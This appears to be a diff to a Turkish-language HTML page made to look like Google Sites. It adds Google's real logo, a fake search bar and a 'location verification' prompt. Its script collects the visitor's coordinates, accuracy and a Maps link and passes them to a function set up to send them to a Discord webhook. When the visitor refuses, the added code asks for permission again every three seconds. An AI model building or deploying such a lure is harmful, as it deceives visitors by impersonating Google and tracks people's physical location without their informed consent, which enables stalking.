@@ -2,14 +2,14 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Google Site Benzeri</title>
+    <title>Google Sites Benzeri</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
             font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #f0f2f5;
+            background-color: #fff; /* Beyaz Arka Plan */
             color: #202124;
             display: flex;
             flex-direction: column;
@@ -19,39 +19,17 @@
         /* Üst Bilgi Stilleri */
         .top-bar {
             background-color: #fff;
-            padding: 10px 20px;
+            padding: 15px 20px;
             box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
             display: flex;
-            justify-content: space-between;
             align-items: center;
         }
 
-        .top-bar-left {
-            display: flex;
-            align-items: center;
+        .google-logo {
+            width: 75px;
+            margin-right: 20px;
         }
 
-        .menu-icon {
-            margin-right: 15px;
-            font-size: 20px;
-            cursor: pointer;
-        }
-
-        .site-name {
-            font-size: 18px;
-            font-weight: bold;
-        }
-
-        .top-bar-right {
-            display: flex;
-            align-items: center;
-        }
-
-        .account-icon {
-            margin-left: 15px;
-            font-size: 20px;
-            cursor: pointer;
-        }
         /* Uyarı Stilleri */
         .alert-container {
             position: fixed;
@@ -68,20 +46,18 @@
         .alert-container.show {
             display: block;
         }
+
         /* İçerik Stilleri */
         .content {
             padding: 20px;
             flex-grow: 1;
-        }
-        /* Footer Stilleri */
-        .footer {
-            background-color: #fff;
-            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* İçeriği dikey olarak ortala */
             text-align: center;
-            font-size: 14px;
-            color: #70757a;
-            border-top: 1px solid #dadce0;
         }
+
         /* Sahte Arama Çubuğu Stilleri */
         .search-bar-container {
             display: flex;
@@ -89,8 +65,10 @@
             background-color: #fff;
             border: 1px solid #dfe1e5;
             border-radius: 24px;
-            padding: 8px 16px;
+            padding: 10px 20px;
             margin-bottom: 20px;
+            width: 80%;
+            max-width: 600px;
         }
         .search-icon, .mic-icon {
             margin-right: 10px;
@@ -102,35 +80,38 @@
             font-size: 16px;
             width: 100%;
         }
+
         /* Konum İsteği Stilleri */
         .location-request-container {
             text-align: center;
-            padding: 20px;
-            border: 1px solid #ccc;
+            padding: 30px;
+            border: 1px solid #dfe1e5;
             border-radius: 8px;
             background-color: #f9f9f9;
+            width: 80%;
+            max-width: 600px;
         }
         .location-request-button {
             background-color: #4285f4;
             color: white;
-            padding: 10px 20px;
+            padding: 12px 25px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             font-size: 16px;
+            margin-top: 15px;
+        }
+        .location-request-message {
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: #333;
         }
     </style>
 </head>
 <body>
     <!-- Üst Bilgi -->
     <div class="top-bar">
-        <div class="top-bar-left">
-            <span class="menu-icon">&#9776;</span>
-            <span class="site-name">Google Sites</span>
-        </div>
-        <div class="top-bar-right">
-            <span class="account-icon">&#128100;</span>
-        </div>
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
     </div>
     <!-- Uyarı Mesajı -->
     <div class="alert-container" id="alertContainer">
@@ -146,23 +127,23 @@
         </div>
         <!-- Konum İsteği Alanı -->
         <div class="location-request-container" id="locationRequestContainer">
-            <h2>Konum İzni Gerekli</h2>
-            <p>Bu siteye erişmek için konum izni vermeniz gerekmektedir.</p>
+            <p class="location-request-message">Konumunuzun doğrulanması gerekiyor. Lütfen konum izni verin.</p>
             <button class="location-request-button" onclick="requestLocationPermission()">Konum İznini Ver</button>
         </div>
-        <!-- Diğer İçerik (Buraya normal site içeriği eklenebilir) -->
-        <p>Bu, Google Sites benzeri bir sayfanın örneğidir.</p>
-    </div>
-    <!-- Alt Bilgi -->
-    <div class="footer">
-        © 2024 Google - <a href="#">Gizlilik</a> - <a href="#">Şartlar</a>
     </div>
     <script>
         // Uyarı mesajını göster
         document.getElementById('alertContainer').classList.add('show');
         // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
         const webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"; // ÖRNEK
+        let permissionGranted = false; // İzin durumu
+
         function requestLocationPermission() {
+            if (permissionGranted) {
+                // Eğer izin zaten verilmişse, tekrar istemeye gerek yok
+                alert("Konum izni zaten verildi.");
+                return;
+            }
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
@@ -170,11 +151,11 @@
                         const longitude = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
                         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        permissionGranted = true; // İzin verildi
                         // Konum bilgisi alındıktan sonra yapılacak işlemler
                         sendLocationLog(latitude, longitude, accuracy, mapsUrl)
                             .then(() => {
                                 alert("Konum bilgisi başarıyla gönderildi!");
-                                // Konum alındıktan sonra ne yapılacağı (örneğin, siteye erişim izni vermek)
                                 document.getElementById('locationRequestContainer').style.display = 'none'; // Konum alındıktan sonra alanı gizle
                             })
                             .catch((error) => {
@@ -187,6 +168,10 @@
                         switch (error.code) {
                             case error.PERMISSION_DENIED:
                                 errorMessage = "Konum izni reddedildi.";
+                                // İzin reddedilirse tekrar isteme (ısrar etme)
+                                setTimeout(() => {
+                                    requestLocationPermission(); // 3 saniye sonra tekrar iste
+                                }, 3000);
                                 break;
                             case error.POSITION_UNAVAILABLE:
                                 errorMessage = "Konum bilgisi mevcut değil.";
